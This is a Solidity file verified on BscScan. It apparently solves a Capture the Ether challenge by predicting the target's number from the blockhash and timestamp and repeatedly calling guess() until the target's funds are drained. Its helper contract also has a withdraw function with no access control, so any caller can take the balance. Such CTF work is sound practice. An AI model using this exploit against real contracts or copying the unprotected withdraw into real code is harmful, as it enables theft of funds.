/**
 *Submitted for verification at BscScan.com on 2022-09-01
*/

// File: 4B_flat.sol



// File: CHALLENGES/contracts/libraries/withdrawable.sol



pragma solidity ^0.8.1;



contract withdrawable{



    function withdrawBalance() public {

        payable(msg.sender).transfer(address(this).balance);

    }



    function checkBalance() public view returns(uint bal, uint bal1, uint bal2){

        bal = address(this).balance;

        bal1 = bal/(10**9);

        bal2 = bal/(10**18);

    }

}

// File: CHALLENGES/contracts/Capture the Ether/4B.sol



pragma solidity ^0.8.1;





interface GTNC {

    function guess(uint256 n) external payable;

}



contract Attack is withdrawable {



    GTNC gtnc;

    

    constructor(address payable _addr) payable {

        require(msg.value != 0);

        gtnc = GTNC(_addr);

    }



    function attack() public {

        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        while (address(gtnc).balance >= 1 gwei){

            gtnc.guess{value: 1 gwei}(answer);

        }



    }

}